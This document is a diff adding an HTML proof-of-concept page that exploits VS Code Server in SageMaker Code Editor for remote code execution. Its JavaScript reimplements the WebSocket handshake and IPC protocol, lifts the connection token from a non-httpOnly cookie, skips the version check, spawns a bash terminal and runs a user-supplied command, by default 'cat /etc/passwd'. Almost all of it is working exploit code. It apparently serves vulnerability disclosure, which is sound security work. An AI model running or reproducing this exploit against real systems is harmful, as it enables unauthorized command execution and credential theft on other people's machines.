@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>SageMaker Code Editor - Terminal PoC (VULN-05/RCE)</title>
+<style>
+body { font-family: monospace; background: #1e1e1e; color: #d4d4d4; margin: 20px; }
+h2 { color: #569cd6; }
+pre { background: #0d0d0d; color: #0f0; padding: 12px; min-height: 300px; overflow: auto; white-space: pre-wrap; border: 1px solid #333; }
+input { background: #2d2d2d; color: #fff; border: 1px solid #555; padding: 6px; font-family: monospace; }
+button { background: #0e639c; color: #fff; border: none; padding: 6px 14px; cursor: pointer; font-family: monospace; }
+button:hover { background: #1177bb; }
+.status { color: #dcdcaa; margin: 8px 0; }
+</style>
+</head>
+<body>
+<h2>VS Code Server WebSocket Terminal PoC</h2>
+<div>
+  <label>Command: </label>
+  <input id="cmd" value="cat /etc/passwd" style="width:400px">
+  <button onclick="execute()">Execute</button>
+  <button onclick="document.getElementById('output').textContent=''">Clear</button>
+</div>
+<div class="status" id="status">Ready. Click Execute to connect.</div>
+<pre id="output"></pre>
+
+<script>
+// ============================================================
+// VS Code Server WebSocket Protocol Implementation
+// Based on: microsoft/vscode v1.90.1 source code
+//
+// Protocol stack (bottom to top):
+//   1. WebSocket (browser handles framing)
+//   2. PersistentProtocol: 13-byte header + data
+//   3. Handshake: JSON control messages (auth/sign/connectionType)
+//   4. IPC: VLQ-serialized channel requests/responses
+//   5. RemoteTerminalChannel: $createProcess, $start, $input
+// ============================================================
+
+const out = document.getElementById('output');
+const statusEl = document.getElementById('status');
+function log(msg) { out.textContent += msg + '\n'; out.scrollTop = out.scrollHeight; }
+function setStatus(s) { statusEl.textContent = s; }
+
+function uuid() {
+  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
+    const r = Math.random() * 16 | 0;
+    return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
+  });
+}
+
+// ---- Layer 2: VS Code Binary Protocol (13-byte header) ----
+// Header: TYPE(1) | ID(4 u32be) | ACK(4 u32be) | DATA_LENGTH(4 u32be)
+// Message types: Regular=1, Control=2, Ack=3, Disconnect=5, KeepAlive=9
+
+class VSCodeProtocol {
+  constructor(ws) {
+    this.ws = ws;
+    this.outMsgId = 0;
+    this.inMsgId = 0;
+    this._controlHandlers = [];
+    this._dataHandlers = [];
+    this._buf = new Uint8Array(0); // accumulation buffer
+
+    ws.binaryType = 'arraybuffer';
+    ws.onmessage = (e) => this._onData(new Uint8Array(e.data));
+  }
+
+  // Send a Control message (type=2, id=0, ack=0)
+  sendControl(jsonObj) {
+    const payload = new TextEncoder().encode(JSON.stringify(jsonObj));
+    this._sendRaw(2, 0, 0, payload);
+  }
+
+  // Send a Regular message (type=1, incrementing id, piggybacked ack)
+  sendRegular(data) {
+    this.outMsgId++;
+    this._sendRaw(1, this.outMsgId, this.inMsgId, data);
+  }
+
+  // Send a KeepAlive (type=9, no data)
+  sendKeepAlive() {
+    this._sendRaw(9, 0, 0, new Uint8Array(0));
+  }
+
+  _sendRaw(type, id, ack, data) {
+    const msg = new Uint8Array(13 + data.length);
+    const dv = new DataView(msg.buffer);
+    msg[0] = type;
+    dv.setUint32(1, id);
+    dv.setUint32(5, ack);
+    dv.setUint32(9, data.length);
+    msg.set(data, 13);
+    this.ws.send(msg);
+  }
+
+  _onData(chunk) {
+    // Accumulate data (messages may span multiple WebSocket frames)
+    const combined = new Uint8Array(this._buf.length + chunk.length);
+    combined.set(this._buf);
+    combined.set(chunk, this._buf.length);
+    this._buf = combined;
+
+    // Parse complete messages
+    while (this._buf.length >= 13) {
+      const dv = new DataView(this._buf.buffer, this._buf.byteOffset);
+      const type = this._buf[0];
+      const id = dv.getUint32(1);
+      const ack = dv.getUint32(5);
+      const dataLen = dv.getUint32(9);
+
+      if (this._buf.length < 13 + dataLen) break; // incomplete
+
+      const payload = this._buf.slice(13, 13 + dataLen);
+      this._buf = this._buf.slice(13 + dataLen);
+
+      if (type === 2) { // Control
+        try {
+          const msg = JSON.parse(new TextDecoder().decode(payload));
+          this._controlHandlers.forEach(h => h(msg));
+        } catch(e) {
+          log('[!] Failed to parse control message: ' + e.message);
+        }
+      } else if (type === 1) { // Regular
+        this.inMsgId = id;
+        this._dataHandlers.forEach(h => h(payload));
+      }
+      // KeepAlive (9), Ack (3), etc. are silently ignored
+    }
+  }
+
+  onControl(handler) { this._controlHandlers.push(handler); }
+  onData(handler) { this._dataHandlers.push(handler); }
+}
+
+
+// ---- Layer 4: IPC Serialization (VLQ encoding) ----
+// DataType: Undefined=0, String=1, Buffer=2, VSBuffer=3, Array=4, Object=5, Int=6
+// Lengths and integers use Variable-Length Quantity (VLQ) encoding
+
+function writeVLQ(writer, value) {
+  if (value === 0) { writer.push(0); return; }
+  while (value > 0) {
+    let byte = value & 0x7F;
+    value = value >>> 7;
+    if (value > 0) byte |= 0x80;
+    writer.push(byte);
+  }
+}
+
+function readVLQ(reader) {
+  let value = 0;
+  for (let n = 0; ; n += 7) {
+    const byte = reader.read();
+    value |= (byte & 0x7F) << n;
+    if (!(byte & 0x80)) return value;
+  }
+}
+
+function serializeIPC(data) {
+  const bytes = [];
+  _serialize(bytes, data);
+  return new Uint8Array(bytes);
+}
+
+function _serialize(w, data) {
+  if (data === undefined || data === null) {
+    w.push(0); // Undefined
+  } else if (typeof data === 'string') {
+    w.push(1); // String
+    const strBytes = new TextEncoder().encode(data);
+    writeVLQ(w, strBytes.length);
+    for (let i = 0; i < strBytes.length; i++) w.push(strBytes[i]);
+  } else if (data instanceof Uint8Array) {
+    w.push(3); // VSBuffer
+    writeVLQ(w, data.length);
+    for (let i = 0; i < data.length; i++) w.push(data[i]);
+  } else if (Array.isArray(data)) {
+    w.push(4); // Array
+    writeVLQ(w, data.length);
+    for (const el of data) _serialize(w, el);
+  } else if (typeof data === 'number' && (data | 0) === data) {
+    w.push(6); // Int
+    writeVLQ(w, data);
+  } else if (typeof data === 'object') {
+    w.push(5); // Object (JSON)
+    const jsonBytes = new TextEncoder().encode(JSON.stringify(data));
+    writeVLQ(w, jsonBytes.length);
+    for (let i = 0; i < jsonBytes.length; i++) w.push(jsonBytes[i]);
+  }
+}
+
+function deserializeIPC(data) {
+  const reader = { pos: 0, data: data, read() { return this.data[this.pos++]; } };
+  const header = _deserialize(reader);
+  const body = _deserialize(reader);
+  return { header, body };
+}
+
+function _deserialize(r) {
+  const type = r.read();
+  switch (type) {
+    case 0: return undefined; // Undefined
+    case 1: { // String
+      const len = readVLQ(r);
+      const bytes = r.data.slice(r.pos, r.pos + len);
+      r.pos += len;
+      return new TextDecoder().decode(bytes);
+    }
+    case 2: // Buffer
+    case 3: { // VSBuffer
+      const len = readVLQ(r);
+      const buf = r.data.slice(r.pos, r.pos + len);
+      r.pos += len;
+      return buf;
+    }
+    case 4: { // Array
+      const len = readVLQ(r);
+      const arr = [];
+      for (let i = 0; i < len; i++) arr.push(_deserialize(r));
+      return arr;
+    }
+    case 5: { // Object (JSON)
+      const len = readVLQ(r);
+      const json = new TextDecoder().decode(r.data.slice(r.pos, r.pos + len));
+      r.pos += len;
+      try { return JSON.parse(json); } catch { return json; }
+    }
+    case 6: { // Int
+      return readVLQ(r);
+    }
+    default: return undefined;
+  }
+}
+
+
+// ---- Layer 5: IPC Channel Client ----
+// RequestType: Promise=100, PromiseCancel=101, EventListen=102, EventDispose=103
+// ResponseType: Initialize=200, PromiseSuccess=201, PromiseError=202, PromiseErrorObj=203, EventFire=204
+
+class IPCClient {
+  constructor(protocol) {
+    this.protocol = protocol;
+    this.reqId = 0;
+    this.handlers = {};
+    this.initialized = false;
+    this._initResolve = null;
+
+    this.initPromise = new Promise(resolve => { this._initResolve = resolve; });
+
+    protocol.onData((payload) => {
+      try {
+        const { header, body } = deserializeIPC(payload);
+        if (!header) return;
+
+        const type = Array.isArray(header) ? header[0] : header;
+
+        if (type === 200) { // Initialize
+          log('[*] IPC: Server initialized');
+          this.initialized = true;
+          this._initResolve();
+          return;
+        }
+
+        const id = Array.isArray(header) ? header[1] : undefined;
+
+        if (type === 201) { // PromiseSuccess
+          if (this.handlers[id]) {
+            this.handlers[id].resolve(body);
+            delete this.handlers[id];
+          }
+        } else if (type === 202) { // PromiseError
+          if (this.handlers[id]) {
+            this.handlers[id].reject(body);
+            delete this.handlers[id];
+          }
+        } else if (type === 203) { // PromiseErrorObj
+          if (this.handlers[id]) {
+            this.handlers[id].reject(body);
+            delete this.handlers[id];
+          }
+        } else if (type === 204) { // EventFire
+          if (this.handlers[id]) {
+            this.handlers[id].fire(body);
+          }
+        }
+      } catch(e) {
+        log('[!] IPC parse error: ' + e.message);
+      }
+    });
+  }
+
+  // Send the client context as the first message (required by IPCServer)
+  sendContext(ctx) {
+    const data = serializeIPC(ctx);
+    this.protocol.sendRegular(data);
+  }
+
+  // Call a method on a channel (returns Promise)
+  call(channelName, method, arg) {
+    const id = ++this.reqId;
+    // header: [RequestType.Promise=100, id, channelName, methodName]
+    const header = [100, id, channelName, method];
+    const bytes = [];
+    _serialize(bytes, header);
+    _serialize(bytes, arg);
+    const data = new Uint8Array(bytes);
+    this.protocol.sendRegular(data);
+
+    return new Promise((resolve, reject) => {
+      this.handlers[id] = { resolve, reject };
+      // Timeout after 15s
+      setTimeout(() => {
+        if (this.handlers[id]) {
+          this.handlers[id].reject(new Error('Request timed out'));
+          delete this.handlers[id];
+        }
+      }, 15000);
+    });
+  }
+
+  // Subscribe to an event on a channel
+  listen(channelName, event, arg, callback) {
+    const id = ++this.reqId;
+    // header: [RequestType.EventListen=102, id, channelName, eventName]
+    const header = [102, id, channelName, event];
+    const bytes = [];
+    _serialize(bytes, header);
+    _serialize(bytes, arg);
+    const data = new Uint8Array(bytes);
+    this.protocol.sendRegular(data);
+
+    this.handlers[id] = { fire: callback };
+    return id; // Return ID for unsubscribing
+  }
+}
+
+
+// ---- Main: Connect and Execute ----
+
+async function execute() {
+  const cmd = document.getElementById('cmd').value;
+  out.textContent = '';
+
+  try {
+    // Step 1: WebSocket connection
+    const reconnToken = uuid();
+    const wsUrl = `${location.protocol === 'https:' ? 'wss' : 'ws'}://${location.host}/?reconnectionToken=${reconnToken}&reconnection=false`;
+    log('[*] Connecting WebSocket: ' + wsUrl);
+    setStatus('Connecting...');
+
+    const ws = new WebSocket(wsUrl);
+    const proto = new VSCodeProtocol(ws);
+
+    await new Promise((resolve, reject) => {
+      ws.onopen = resolve;
+      ws.onerror = () => reject(new Error('WebSocket connection failed'));
+      setTimeout(() => reject(new Error('WebSocket timeout')), 5000);
+    });
+    log('[+] WebSocket connected');
+
+    // KeepAlive interval (every 5s to prevent timeout)
+    const keepAlive = setInterval(() => proto.sendKeepAlive(), 5000);
+
+    // Step 2: VS Code handshake - send Auth
+    setStatus('Handshake: sending auth...');
+    const clientNonce = uuid();
+
+    // Try to get connection token from cookie (VULN-17: not httpOnly)
+    let connToken = '00000000000000000000';
+    const tknMatch = document.cookie.match(/vscode-tkn=([^;]+)/);
+    if (tknMatch) connToken = tknMatch[1];
+
+    proto.sendControl({
+      type: 'auth',
+      auth: connToken,
+      data: clientNonce
+    });
+    log('[*] Sent auth (token: ' + connToken.substring(0, 8) + '...)');
+
+    // Step 3: Wait for Sign request
+    const signMsg = await new Promise((resolve, reject) => {
+      const timeout = setTimeout(() => reject(new Error('Handshake timeout waiting for sign')), 10000);
+      proto.onControl(msg => {
+        clearTimeout(timeout);
+        if (msg.type === 'error') reject(new Error('Auth rejected: ' + msg.reason));
+        else if (msg.type === 'sign') resolve(msg);
+        else reject(new Error('Unexpected message: ' + JSON.stringify(msg)));
+      });
+    });
+    log('[+] Received sign challenge');
+
+    // Step 4: Send ConnectionType (Management=1)
+    // For web client: signedData = connection token (server accepts this)
+    setStatus('Handshake: sending connection type...');
+    proto.sendControl({
+      type: 'connectionType',
+      commit: undefined,  // Don't send commit to skip version check
+      signedData: connToken,
+      desiredConnectionType: 1,  // Management
+    });
+    log('[*] Sent connectionType=Management');
+
+    // Step 5: Wait for OK
+    const okMsg = await new Promise((resolve, reject) => {
+      const timeout = setTimeout(() => reject(new Error('Handshake timeout waiting for OK')), 10000);
+      // Clear existing handlers and add new one
+      proto._controlHandlers = [];
+      proto.onControl(msg => {
+        clearTimeout(timeout);
+        if (msg.type === 'error') reject(new Error('Connection rejected: ' + msg.reason));
+        else if (msg.type === 'ok') resolve(msg);
+        else reject(new Error('Unexpected: ' + JSON.stringify(msg)));
+      });
+    });
+    log('[+] Management connection established!');
+    setStatus('IPC: sending context...');
+
+    // Step 6: Send client context (required by IPCServer)
+    // This must be the first Regular message
+    const ipc = new IPCClient(proto);
+    ipc.sendContext({
+      remoteAuthority: location.host,
+      clientId: uuid()
+    });
+    log('[*] Sent IPC context');
+
+    // Step 7: Wait for Initialize (200) response
+    await Promise.race([
+      ipc.initPromise,
+      new Promise((_, reject) => setTimeout(() => reject(new Error('IPC init timeout')), 10000))
+    ]);
+    log('[+] IPC channel ready');
+    setStatus('Creating terminal...');
+
+    // Small delay to let server register channels
+    await new Promise(r => setTimeout(r, 500));
+
+    // Step 8: Subscribe to process data events FIRST
+    let termOutput = '';
+    ipc.listen('remoteterminal', '$onProcessDataEvent', undefined, (data) => {
+      // data = { id: number, event: { data: string } | string }
+      let text = '';
+      if (data && data.event) {
+        text = typeof data.event === 'string' ? data.event : (data.event.data || '');
+      } else if (typeof data === 'string') {
+        text = data;
+      }
+      if (text) {
+        termOutput += text;
+        out.textContent += text;
+        out.scrollTop = out.scrollHeight;
+      }
+    });
+
+    // Also listen for process ready
+    ipc.listen('remoteterminal', '$onProcessReadyEvent', undefined, (data) => {
+      log('[+] Process ready: ' + JSON.stringify(data));
+    });
+
+    // Also listen for process exit
+    ipc.listen('remoteterminal', '$onProcessExitEvent', undefined, (data) => {
+      log('\n[*] Process exited: ' + JSON.stringify(data));
+      setStatus('Process exited');
+      clearInterval(keepAlive);
+    });
+
+    log('[*] Event listeners registered');
+
+    // Step 9: Create terminal process
+    log('[*] Calling $createProcess...');
+    let createResult;
+    try {
+      createResult = await ipc.call('remoteterminal', '$createProcess', {
+        configuration: {
+          'terminal.integrated.env.linux': {},
+          'terminal.integrated.cwd': '/home/sagemaker-user',
+        },
+        resolvedVariables: {},
+        envVariableCollections: [],
+        shellLaunchConfig: {
+          executable: '/bin/bash',
+          args: [],
+          cwd: '/home/sagemaker-user',
+          name: 'poc-terminal'
+        },
+        workspaceId: 'default',
+        workspaceName: 'workspace',
+        workspaceFolders: [],
+        activeWorkspaceFolder: null,
+        activeFileResource: undefined,
+        shouldPersistTerminal: false,
+        options: {
+          shellIntegration: { enabled: false },
+          windowsEnableConpty: false
+        },
+        cols: 80,
+        rows: 30,
+        unicodeVersion: '11',
+        resolverEnv: undefined
+      });
+    } catch(e) {
+      log('[!] $createProcess error: ' + (e.message || JSON.stringify(e)));
+      log('[*] Trying simpler $getDefaultSystemShell to verify channel works...');
+      try {
+        const shell = await ipc.call('remoteterminal', '$getDefaultSystemShell', [3]); // 3 = Linux
+        log('[+] Default shell: ' + JSON.stringify(shell));
+        log('[*] Channel is working. $createProcess args may need adjustment.');
+      } catch(e2) {
+        log('[!] $getDefaultSystemShell also failed: ' + (e2.message || JSON.stringify(e2)));
+        log('[*] The remoteterminal channel may not be registered yet.');
+        log('[*] Try: $listProcesses to check channel availability');
+        try {
+          const procs = await ipc.call('remoteterminal', '$listProcesses', undefined);
+          log('[+] listProcesses: ' + JSON.stringify(procs));
+        } catch(e3) {
+          log('[!] $listProcesses failed: ' + (e3.message || JSON.stringify(e3)));
+        }
+      }
+      setStatus('Error - see output');
+      clearInterval(keepAlive);
+      return;
+    }
+
+    const termId = createResult.persistentTerminalId;
+    log('[+] Terminal created, ID: ' + termId);
+    log('[+] Shell: ' + JSON.stringify(createResult.resolvedShellLaunchConfig));
+
+    // Step 10: Start the terminal process
+    setStatus('Starting terminal...');
+    try {
+      const startResult = await ipc.call('remoteterminal', '$start', [termId]);
+      log('[*] $start result: ' + JSON.stringify(startResult));
+    } catch(e) {
+      log('[!] $start error: ' + (e.message || JSON.stringify(e)));
+    }
+
+    // Step 11: Wait a moment for shell to initialize, then send command
+    setStatus('Sending command: ' + cmd);
+    await new Promise(r => setTimeout(r, 500));
+
+    log('[*] Sending command: ' + cmd);
+    log('------- OUTPUT -------');
+    await ipc.call('remoteterminal', '$input', [termId, cmd + '\n']);
+
+    // Wait for output, then send exit
+    setStatus('Waiting for output...');
+    setTimeout(async () => {
+      try {
+        // Send exit to clean up
+        await ipc.call('remoteterminal', '$input', [termId, 'exit\n']);
+      } catch(e) {}
+      setTimeout(() => {
+        setStatus('Done');
+        clearInterval(keepAlive);
+        ws.close();
+      }, 2000);
+    }, 5000);
+
+  } catch(e) {
+    log('[!] Error: ' + e.message);
+    log('[!] Stack: ' + (e.stack || 'N/A'));
+    setStatus('Error - see output');
+  }
+}
+</script>
+</body>
+</html>
